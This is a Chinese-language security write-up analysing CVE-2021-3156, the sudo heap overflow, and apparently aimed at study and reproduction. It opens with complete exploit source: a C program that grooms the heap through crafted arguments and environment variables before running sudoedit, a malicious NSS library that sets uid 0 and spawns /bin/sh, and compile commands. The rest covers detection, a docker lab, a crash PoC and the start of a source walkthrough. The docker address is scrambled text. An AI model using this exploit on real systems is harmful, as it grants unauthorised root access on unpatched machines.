
```c
1.#include<stdio.h>
2.#include<string.h>
3.#include<stdlib.h>
4.#include<math.h>
5.
6.#define \_\_LC\_CTYPE 0
7.#define \_\_LC\_NUMERIC 1
8.#define \_\_LC\_TIME 2
9.#define \_\_LC\_COLLATE 3
10.#define \_\_LC\_MONETARY 4
11.#define \_\_LC\_MESSAGES 5
12.#define \_\_LC\_ALL 6
13.#define \_\_LC\_PAPER 7
14.#define \_\_LC\_NAME 8
15.#define \_\_LC\_ADDRESS 9
16.#define \_\_LC\_TELEPHONE 10
17.#define \_\_LC\_MEASUREMENT 11
18.#define \_\_LC\_IDENTIFICATION 12
19.
20.char \* envName[13]={"LC\_CTYPE","LC\_NUMERIC","LC\_TIME","LC\_COLLATE","LC\_MONETARY","LC\_MESSAGES","LC\_ALL","LC\_PAPER","LC\_NAME","LC\_ADDRESS","LC\_TELE
21.PHONE","LC\_MEASUREMENT","LC\_IDENTIFICATION"};
22.
23.int now=13;
24.int envnow=0;
25.int argvnow=0;
26.char \* envp[0x300];
27.char \* argv[0x300];
28.char \* addChunk(int size)
29.{
30. now --;
31. char \* result;
32. if(now ==6)
33. {
34. now --;
35. }
36. if(now>=0)
37. {
38. result=malloc(size+0x20);
39. strcpy(result,envName[now]);
40. strcat(result,"=C.UTF-8@");
41. for(int i=9;i<=size-0x17;i++)
42. strcat(result,"A");
43. envp[envnow++]=result;
44. }
45. return result;
46.}
47.
48.void final()
49.{
50. now --;
51. char \* result;
52. if(now ==6)
53. {
54. now --;
55. }
56. if(now>=0)
57. {
58. result=malloc(0x100);
59. strcpy(result,envName[now]);
60. strcat(result,"=xxxxxxxxxxxxxxxxxxxxx");
61. envp[envnow++]=result;
62. }
63.}
64.
65.int setargv(int size,int offset)
66.{
67. size-=0x10;
68. signed int x,y;
69. signed int a=-3;
70. signed int b=2\*size-3;
71. signed int c=2\*size-2-offset\*2;
72. signed int tmp=b\*b-4\*a\*c;
73. if(tmp<0)
74. return -1;
75. tmp=(signed int)sqrt((double)tmp\*1.0);
76. signed int A=(0-b+tmp)/(2\*a);
77. signed int B=(0-b-tmp)/(2\*a);
78. if(A<0 && B<0)
79. return -1;
80. if((A>0 && B<0) || (A<0 && B>0))
81. x=(A>0) ? A: B;
82. if(A>0 && B > 0)
83. x=(A<B) ? A : B;
84. y=size-1-x\*2;
85. int len=x+y+(x+y+y+1)\*x/2;
86.
87. while ((signed int)(offset-len)<2)
88. {
89. x--;
90. y=size-1-x\*2;
91. len=x+y+(x+y+1)\*x/2;
92. if(x<0)
93. return -1;
94. }
95. int envoff=offset-len-2+0x30;
96. printf("%d,%d,%d\n",x,y,len);
97. char \* Astring=malloc(size);
98. int i=0;
99. for(i=0;i<y;i++)
100. Astring[i]='A';
101. Astring[i]='\x00';
102.
103. argv[argvnow++]="sudoedit";
104. argv[argvnow++]="-s";
105. for (i=0;i<x;i++)
106. argv[argvnow++]="\\";
107. argv[argvnow++]=Astring;
108. argv[argvnow++]="\\";
109. argv[argvnow++]=NULL;
110. for(i=0;i<envoff;i++)
111. envp[envnow++]="\\";
112. envp[envnow++]="X/test";
113. return 0;
114.}
115.
116.int main()
117.{
118. setargv(0xa0,0x650);
119. addChunk(0x40);
120. addChunk(0x40);
121. addChunk(0xa0);
122. addChunk(0x40);
123. final();
124.
125. execve("/usr/local/bin/sudoedit",argv,envp);
126.}
1.#include <unistd.h>
2.#include <stdio.h>
3.#include <stdlib.h>
4.#include <string.h>
5.
6.static void \_\_attribute\_\_ ((constructor)) \_init(void);
7.
8.static void \_init(void) {
9. printf("[+] bl1ng bl1ng! We got it!\n");
10.#ifndef BRUTE
11. setuid(0); seteuid(0); setgid(0); setegid(0);
12. static char \*a\_argv[] = { "sh", NULL };
13. static char \*a\_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
14. execv("/bin/sh", a\_argv);
15.#endif
16.}
```

编译命令：

```bash
1.mkdir libnss\_X
2.gcc -fPIC -shared lib.c -o ./libnss\_X/test.so.2
3.gcc exp.c -o exp
```

# 一、概述

CVE-2021-3156 漏洞主要成因在于sudo中存在一个基于堆的缓冲区溢出漏洞，当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码

# 二、漏洞简介与环境搭建

## 漏洞简介：

漏洞编号: CVE-2021-3156

漏洞产品: sudo

影响版本:

1.8.2-1.8.31sp12;

1.9.0-1.9.5sp1

利用后果: 本地提权

## 漏洞检测：

用户首先使用非root账户登录系统，然后执行

`sudoedit` `-s` `/`

如果返回如图所示以usage开头的报错：

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_YUHNERRSRE385HZ.jpg)

则说明当前系统不存在此漏洞或漏洞已修复

如果返回如下图所示以sudoedit为开头的报错则说明系统存在此漏洞：

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_ZSR29P6KX9HRDUT.jpg)

## 环境搭建：

由于本人的虚拟机中的ubuntu系统均已修复此漏洞，所以直接选择用拉取合适的docker

docker 环境: 879K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5N6h3u0Q4x3X3g2V1L8$3y4C8k6i4u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5i4K6u0r3j5$3S2W2L8X3q4G2N6r3W2S2L8W2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0q4Q4x3X3b7K6x3e0f1$3

这个docker中提供了：

1.自己编译的可源码调式的sudo

2.有调试符号的glibc

3.gdb 和gdb插件pwngdb & pwndbg

4.exp.c 及其编译成功的exp

这对我们的漏洞分析和漏洞复现过程有很大帮助，可以让我们把更多的时间和精力放到对漏洞代码的分析和利用上，而不是苦逼的配环境。

首先拉取镜像

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_VNB8WF2BA3N5P2P.jpg)

然后启动docker，查看一下sudo的版本：

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_KSDK38ZPRTEB58Q.jpg)

用上面提到的漏洞检测方式来检查一下是否存在此漏洞：

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_V29ZP8SPVXSV3JN.jpg)

最后检测一下是否可以打通：

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_DX4VZ52F8USWWK6.jpg)

用的是id为1000的test账户执行exp，执行完之后用户权限已经变成了root，成功提权，到这里所有的漏洞复现准备工作都做完了，接下来进行漏洞分析

# 三、漏洞分析

首先来分析一下此漏洞的POC：

`sudoedit` `-s` `` '\' `python3 -c "print(' ```A'``*``80``` )"` ``

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202207/954038_GQAGVX36XY8C7FG.jpg)
可以看到是一个内存错误，此漏洞就在于sudo没有正确处理好反斜杠。当使用-s或-i的时候，sudo会转义特殊字符，但是如果用-s或-i参数和sudoedit命令，特殊字符不会被转义，这会导致一个缓冲区溢出。可以看到我们所用的poc就是使用sudoedit命令以及-s 参数，后面则是一个反斜杠加上由python3命令生成的80个A。

接下来我们深入到sudo源码里去看看为什么这样一行命令就可以造成缓冲区溢出，从而导致程序崩溃甚至最后达到提权的目的。

先来看sudo.c的133行，也就是main函数位置

```c
1.int parse_args(int argc, char **argv, int *nargc, char ***nargv,
2.    struct sudo_settings **settingsp, char ***env_addp)
3.{
4.    struct environment extra_env;
5.    int mode = 0; /* what mode is sudo to be run in? */
6.    int flags = 0; /* mode flags */
7.    int valid_flags = DEFAULT_VALID_FLAGS;
8.    int ch, i;
9.    char *cp;
10.    const char *runas_user = NULL;
11.    const char *runas_group = NULL;
12.    const char *progname;
13.    int proglen;
14.    debug_decl(parse_args, SUDO_DEBUG_ARGS)
15.······
16.······
17. /* First, check to see if we were invoked as "sudoedit". */
18.    proglen = strlen(progname);
19.    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
20.    progname = "sudoedit";
21.    mode = MODE_EDIT;
22.    sudo_settings[ARG_SUDOEDIT].value = "true";
23.    }
24.······
25.······
26.    case 's':
27.            sudo_settings[ARG_USER_SHELL].value = "true";
28.            SET(flags, MODE_SHELL);
29.            break;
30.······
31.······
32.}
```

首先`parse_args`会检测执行命令的长度，如果大于4且后四个字母为edit，则说明调用的不是sudo而是sudoedit，于是将mode设置为`MODE_EDIT`，然后去检测参数，如果参数为-s，则把flags设置为`MODE_SHELL`

接下来继续跟进main函数，然后会执行`policy_check`函数

跟进一下:

```c
1.static int policy_check(struct plugin_container *plugin, int argc, char * const argv[],
2.    char **env_add[], char **command_info[], char **argv_out[],
3.    char **user_env_out[])
4.{
5.    int ret;
6.    debug_decl(policy_check, SUDO_DEBUG_PCOMM)
7.
8.    if (plugin->u.policy->check_policy == NULL) {
9.    sudo_fatalx(U_( "policy plugin %s is missing the `check_policy' method"),
10.        plugin->name);
11.    }
12.    sudo_debug_set_active_instance(plugin->debug_instance);
13.    ret = plugin->u.policy->check_policy(argc, argv, env_add, command_info,
14.    argv_out, user_env_out);
15.    sudo_debug_set_active_instance(sudo_debug_instance);
16.    debug_return_int(ret);
17.}
```
